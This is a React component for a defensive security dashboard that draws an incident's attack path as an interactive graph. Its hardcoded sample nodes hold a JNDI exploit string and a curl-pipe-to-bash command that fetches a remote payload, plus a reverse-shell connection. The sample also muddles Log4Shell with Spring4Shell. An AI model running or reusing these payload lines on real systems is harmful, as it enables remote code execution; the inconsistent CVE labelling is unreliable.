/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 
 * SENTINEL FUSION - Cross-Tool Investigation & Attack Path Graph
 * Interactive SVG graph mapping assets, services, network alerts, processes, and C2 beacons.
 */

import React, { useState } from 'react';
import { Incident } from '../types/security';
import { 
  GitBranch, 
  Info, 
  ShieldAlert, 
  Terminal, 
  Server, 
  Layers, 
  Activity, 
  Globe, 
  CheckCircle2,
  X
} from 'lucide-react';

interface AttackGraphProps {
  incident: Incident;
}

interface GraphNode {
  id: string;
  type: 'ATTACKER' | 'PERIMETER' | 'TARGET_ASSET' | 'SERVICE' | 'EXPLOIT_PAYLOAD' | 'PROCESS' | 'C2_CHANNEL';
  label: string;
  sublabel: string;
  x: number;
  y: number;
  toolSource: string;
  confirmed: boolean;
  eventIds: string[];
  details: Record<string, string>;
}

interface GraphEdge {
  from: string;
  to: string;
  label: string;
  confirmed: boolean; // true = solid line, false = dashed hypothesis line
  protocol?: string;
}

export const AttackGraph: React.FC<AttackGraphProps> = ({ incident }) => {
  const [selectedNodeId, setSelectedNodeId] = useState<string | null>('node-target');

  const nodes: GraphNode[] = [
    {
      id: 'node-attacker',
      type: 'ATTACKER',
      label: '194.26.29.112',
      sublabel: 'Threat Actor (APT-29)',
      x: 80,
      y: 200,
      toolSource: 'MISP Threat Intel',
      confirmed: true,
      eventIds: ['EV-MISP-007'],
      details: {
        'Threat Group': 'APT-29 / CozyBear',
        'Reputation Confidence': '94%',
        'MISP Event ID': '8491',
        'Ingress Origin': 'External Internet AS4932'
      }
    },
    {
      id: 'node-gateway',
      type: 'PERIMETER',
      label: 'DMZ Reverse Proxy',
      sublabel: '172.16.0.5 (Nginx)',
      x: 270,
      y: 200,
      toolSource: 'Suricata NIDS',
      confirmed: true,
      eventIds: ['EV-SURI-002'],
      details: {
        'Interface': 'eth0 (External)',
        'Flow ID': '918237192837',
        'Inspection Action': 'Allowed Ingress POST',
        'Forward Rule': 'NAT to 10.0.4.15:8443'
      }
    },
    {
      id: 'node-target',
      type: 'TARGET_ASSET',
      label: 'Corp-DB01.fin.corp',
      sublabel: '10.0.4.15 (Ubuntu 22.04)',
      x: 480,
      y: 200,
      toolSource: 'Unified Asset Inventory',
      confirmed: true,
      eventIds: ['EV-NMAP-001', 'EV-WAZUH-005'],
      details: {
        'Asset Criticality': 'TIER_1_CRITICAL',
        'Segment': 'INTERNAL_CORE',
        'Wazuh Agent ID': '004',
        'Postgres Database': 'Port 5432 (Healthy)'
      }
    },
    {
      id: 'node-service',
      type: 'SERVICE',
      label: 'Port 8443/TCP',
      sublabel: 'Spring Core / Tomcat',
      x: 480,
      y: 70,
      toolSource: 'Nmap Discovery',
      confirmed: true,
      eventIds: ['EV-NMAP-001'],
      details: {
        'Baseline Diff': 'UNEXPECTED_NEW (Policy Violation)',
        'Service Version': 'Spring Core 5.3.17',
        'Discovery Timestamp': '08:12:15 UTC',
        'State': 'Open / Listening'
      }
    },
    {
      id: 'node-exploit',
      type: 'EXPLOIT_PAYLOAD',
      label: 'JNDI Exploit String',
      sublabel: 'Suricata SID: 2034334',
      x: 480,
      y: 330,
      toolSource: 'TShark / Suricata',
      confirmed: true,
      eventIds: ['EV-SURI-002', 'EV-PCAP-003'],
      details: {
        'Injection Target': 'User-Agent Header',
        'Payload String': '${jndi:ldap://194.26.29.112:1389/Exploit}',
        'CVE': 'CVE-2021-44228 / Spring4Shell',
        'Frame Number': '1425'
      }
    },
    {
      id: 'node-process',
      type: 'PROCESS',
      label: 'PID 5104 (/bin/sh)',
      sublabel: 'Spawned by Java (PID 4821)',
      x: 710,
      y: 200,
      toolSource: 'Wazuh EDR (Rule 100201)',
      confirmed: true,
      eventIds: ['EV-WAZUH-005'],
      details: {
        'Parent PID': '4821 (/usr/lib/jvm/java-17)',
        'Child Process': '/bin/sh',
        'Execution Command': 'curl -s http://194.26.29.112/payload.sh | bash',
        'Executed As': 'www-data'
      }
    },
    {
      id: 'node-c2',
      type: 'C2_CHANNEL',
      label: 'Reverse Shell Beacon',
      sublabel: 'TCP Port 4444 Stream',
      x: 910,
      y: 200,
      toolSource: 'TShark Packet Capture',
      confirmed: true,
      eventIds: ['EV-PCAP-006'],
      details: {
        'Frame Number': '1435',
        'Socket Stream': '10.0.4.15:53990 -> 194.26.29.112:4444',
        'Interactive Prompt': 'www-data@Corp-DB01$ uname -a',
        'C2 Status': 'ACTIVE_ESTABLISHED'
      }
    }
  ];

  const edges: GraphEdge[] = [
    { from: 'node-attacker', to: 'node-gateway', label: 'Ingress Exploit POST', confirmed: true, protocol: 'HTTPS' },
    { from: 'node-gateway', to: 'node-target', label: 'Reverse Proxy Pass', confirmed: true, protocol: 'TCP :8443' },
    { from: 'node-target', to: 'node-service', label: 'Exposed Listening Socket', confirmed: true, protocol: 'Audit Diff' },
    { from: 'node-target', to: 'node-exploit', label: 'Injected into JVM Memory', confirmed: true, protocol: 'JNDI' },
    { from: 'node-target', to: 'node-process', label: 'Execution Spawn', confirmed: true, protocol: 'Kernel fork()' },
    { from: 'node-process', to: 'node-c2', label: 'Outbound TCP Connection', confirmed: true, protocol: 'TCP :4444' },
    { from: 'node-c2', to: 'node-attacker', label: 'Egress Reverse Shell Return', confirmed: true, protocol: 'C2 Beacon' }
  ];

  const selectedNode = nodes.find(n => n.id === selectedNodeId);

  const getNodeColor = (type: GraphNode['type']) => {
    switch (type) {
      case 'ATTACKER': return '#f43f5e'; // rose-500
      case 'PERIMETER': return '#06b6d4'; // cyan-500
      case 'TARGET_ASSET': return '#3b82f6'; // blue-500
      case 'SERVICE': return '#f59e0b'; // amber-500
      case 'EXPLOIT_PAYLOAD': return '#ec4899'; // pink-500
      case 'PROCESS': return '#10b981'; // emerald-500
      case 'C2_CHANNEL': return '#a855f7'; // purple-500
    }
  };

  return (
    <div className="p-4 sm:p-6 space-y-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <div className="flex items-center gap-2">
            <GitBranch className="w-5 h-5 text-cyan-400" />
            <h1 className="text-xl font-bold text-white tracking-tight">
              Cross-Tool Investigation & Attack Path Graph
            </h1>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            Visual topological causality correlating network discovery, IDS signatures, packet streams, and endpoint processes.
          </p>
        </div>

        {/* Legend */}
        <div className="flex items-center gap-3 text-xs font-mono bg-slate-900 px-3 py-1.5 rounded-lg border border-slate-800">
          <div className="flex items-center gap-1.5">
            <span className="w-3 h-0.5 bg-cyan-400 inline-block" />
            <span className="text-slate-300">Confirmed Evidence</span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className="w-3 h-0.5 border-t-2 border-dashed border-amber-400 inline-block" />
            <span className="text-slate-400">Hypothesized Path</span>
          </div>
        </div>
      </div>

      {/* SVG Canvas & Node Inspector Container */}
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Interactive SVG Diagram */}
        <div className="lg:col-span-3 bg-slate-950 border border-slate-800 rounded-xl p-4 shadow-2xl relative overflow-x-auto min-h-[460px] flex items-center justify-center">
          <svg 
            viewBox="0 0 1020 420" 
            className="w-full h-auto min-w-[800px]"
          >
            <defs>
              <marker id="arrow" viewBox="0 0 10 10" refX="22" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                <path d="M 0 0 L 10 5 L 0 10 z" fill="#0891b2" />
              </marker>
              <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                <feGaussianBlur stdDeviation="3" result="blur" />
                <feComposite in="SourceGraphic" in2="blur" operator="over" />
              </filter>
            </defs>

            {/* Render Edges */}
            {edges.map((edge, i) => {
              const fromNode = nodes.find(n => n.id === edge.from);
              const toNode = nodes.find(n => n.id === edge.to);
              if (!fromNode || !toNode) return null;

              // Curved path for loopback or clean arcs
              const isArc = edge.from === 'node-c2' && edge.to === 'node-attacker';
              let pathD = `M ${fromNode.x} ${fromNode.y} L ${toNode.x} ${toNode.y}`;

              if (isArc) {
                pathD = `M ${fromNode.x} ${fromNode.y + 15} Q 500 400 ${toNode.x} ${toNode.y + 20}`;
              }

              return (
                <g key={i}>
                  <path
                    d={pathD}
                    fill="none"
                    stroke={edge.confirmed ? '#0891b2' : '#f59e0b'}
                    strokeWidth={edge.confirmed ? '2' : '1.5'}
                    strokeDasharray={edge.confirmed ? 'none' : '4,4'}
                    markerEnd="url(#arrow)"
                    opacity="0.8"
                  />
                  {/* Edge label */}
                  {!isArc && (
                    <text
                      x={(fromNode.x + toNode.x) / 2}
                      y={(fromNode.y + toNode.y) / 2 - 8}
                      fill="#94a3b8"
                      fontSize="9"
                      fontFamily="monospace"
                      textAnchor="middle"
                      className="select-none"
                    >
                      {edge.label}
                    </text>
                  )}
                </g>
              );
            })}

            {/* Render Nodes */}
            {nodes.map(node => {
              const isSelected = selectedNodeId === node.id;
              const color = getNodeColor(node.type);

              return (
                <g
                  key={node.id}
                  transform={`translate(${node.x}, ${node.y})`}
                  onClick={() => setSelectedNodeId(node.id)}
                  className="cursor-pointer transition-transform hover:scale-110"
                >
                  {/* Glow circle if selected */}
                  {isSelected && (
                    <circle
                      r="28"
                      fill={color}
                      opacity="0.25"
                      filter="url(#glow)"
                    />
                  )}

                  {/* Outer circle */}
                  <circle
                    r="20"
                    fill="#020617"
                    stroke={color}
                    strokeWidth={isSelected ? '3' : '2'}
                  />

                  {/* Inner indicator dot */}
                  <circle
                    r="8"
                    fill={color}
                    opacity="0.9"
                  />

                  {/* Node Title & Sublabel */}
                  <text
                    y="34"
                    fill="#f8fafc"
                    fontSize="11"
                    fontWeight="bold"
                    textAnchor="middle"
                    className="select-none"
                  >
                    {node.label}
                  </text>
                  <text
                    y="46"
                    fill="#94a3b8"
                    fontSize="9"
                    fontFamily="monospace"
                    textAnchor="middle"
                    className="select-none"
                  >
                    {node.sublabel}
                  </text>
                </g>
              );
            })}
          </svg>
        </div>

        {/* Selected Node Inspection Card */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-4">
          <div className="flex items-center justify-between">
            <span className="text-xs font-bold uppercase tracking-wider text-slate-400">
              Graph Node Inspector
            </span>
            {selectedNode && (
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 border border-emerald-800">
                VERIFIED EVIDENCE ✓
              </span>
            )}
          </div>

          {selectedNode ? (
            <div className="space-y-4 text-xs">
              <div>
                <h3 className="text-sm font-bold text-white">{selectedNode.label}</h3>
                <p className="text-cyan-400 font-mono text-xs">{selectedNode.sublabel}</p>
              </div>

              <div className="p-2.5 bg-slate-950 rounded-lg border border-slate-800 space-y-1 font-mono">
                <div className="text-slate-400">
                  Tool Origin: <span className="text-slate-200 font-bold">{selectedNode.toolSource}</span>
                </div>
                <div className="text-slate-400">
                  Node Type: <span className="text-indigo-400">{selectedNode.type}</span>
                </div>
              </div>

              <div className="space-y-2">
                <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block">
                  Node Attributes:
                </span>
                <div className="space-y-1.5 font-mono">
                  {Object.entries(selectedNode.details).map(([k, v]) => (
                    <div key={k} className="p-2 bg-slate-950 rounded border border-slate-800/80">
                      <div className="text-[10px] text-slate-500 uppercase">{k}</div>
                      <div className="text-slate-200 text-xs font-medium break-all">{v}</div>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider block mb-1.5">
                  Supporting Event IDs:
                </span>
                <div className="flex flex-wrap gap-1">
                  {selectedNode.eventIds.map(eid => (
                    <span key={eid} className="font-mono text-[10px] px-2 py-1 bg-cyan-950 border border-cyan-800 text-cyan-300 rounded font-semibold">
                      {eid}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          ) : (
            <div className="text-slate-500 text-xs text-center py-10">
              Select any node in the attack graph to inspect technical forensic details.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
